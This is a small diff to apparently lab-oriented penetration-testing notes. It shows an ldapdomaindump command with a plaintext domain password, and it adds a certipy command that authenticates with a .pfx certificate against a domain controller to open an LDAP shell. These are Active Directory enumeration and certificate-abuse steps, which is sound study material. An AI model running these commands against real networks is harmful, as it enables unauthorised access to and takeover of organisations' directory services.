@@ -56,3 +56,7 @@ sudo ldapdomaindump ldaps://10.13.37.10 -u 'MARVEL\fcastle' -p Password1
 
 firefox domain_users_by_group.html
 ```
+
+```
+certipy auth -pfx baker.pfx -dc-ip 10.129.234.143 -ldap-shell
+```
